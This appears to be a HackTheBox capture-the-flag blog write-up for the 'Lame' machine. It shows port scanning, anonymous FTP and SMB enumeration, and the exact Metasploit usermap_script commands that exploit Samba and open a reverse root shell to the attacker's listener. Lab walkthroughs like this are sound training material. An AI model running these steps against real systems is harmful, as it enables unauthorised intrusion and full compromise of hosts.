---
Platform: HackTheBox
Difficulty: Easy
tags:
  - RCE
Status: Rooted/Finished
Type: Machine
Title: Lame
Category: 
CreatedOn: 04-12-2023
---
# Lame

Hello everyone, In this blog we are going to solve Lame from HackTheBox.

Link for the machine : [https://app.hackthebox.com/machines/1](https://app.hackthebox.com/machines/1)

  

Lets Start ðŸ™Œ

  

Connect to the HTB server by using the OpenVpn configuration file thatâ€™s generated by HTB.

[ [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to vpn and access the boxes. ]

After connecting to the vpn service, click on Join Machine to access the machineâ€™s ip.

After joining the machine you can see the IP Address of the target machine.

  

First start the reconnaissance by running `rustscan` on the target IP address.

Command: `rustscan -a 10.10.10.3 -- -A -Pn`

![Untitled.png](Lame/assets/Untitled.png)

![Untitled 1.png](Lame/assets/Untitled%201.png)

From the results, we got the following ports and services running:

|   |   |   |
|---|---|---|
|Port|Service|Version|
|21|FTP|vsftpd 2.3.4|
|22|SSH|OpenSSH 4.7p1|
|139|netbios-ssn|Samba smbd 3.X - 4.X|
|445|netbios-ssn|Samba smbd 3.X - 4.X|
|3632|distccd|distccd v1|

First, I started enumerating the FTP service running on Port `21`.

From the scan results, we can see that the Anonymous login is allowed for FTP

![Untitled 2.png](Lame/assets/Untitled%202.png)

So I tried to login as `Anonymous`

Command: `ftp 10.10.10.3`

username: `Anonymous`

Password: `Anonymous`

![Untitled 3.png](Lame/assets/Untitled%203.png)

![Untitled 4.png](Lame/assets/Untitled%204.png)

Found nothing in the FTP anonymous Login.

Next I started to enumerate SMB service running on port 139. I used `enum4linux` tool to enumerate.

Command: `enum4linux -a 10.10.10.3`

![Untitled 5.png](Lame/assets/Untitled%205.png)

From the response of `enum4linux`, I didnâ€™t found any interesting shares.

  

Next, I searched for exploits for the samba version: `Samba smbd 3.X - 4.X` and found the this version is vulnerable to command execution.

[https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

To use the above exploit, execute the commands in `msfconsole` as follows:

`use exploit/multi/samba/usermap_script`

`set RHOSTS 10.10.10.3`

`set LHOST tun0` ( Here tun0 is your hackthebox vpn tunnel IP )

`run`

![Untitled 6.png](Lame/assets/Untitled%206.png)

Now we have got access to the target machine as `root`. I searched for the user flag using the following command:

command: `find / -name user.txt`

![Untitled 7.png](Lame/assets/Untitled%207.png)

And we have found the user flag.

Now I searched for the root flag using the same method and found the root flag:

![Untitled 8.png](Lame/assets/Untitled%208.png)

  

We have successfully found all the flags.

  

Thank You !!!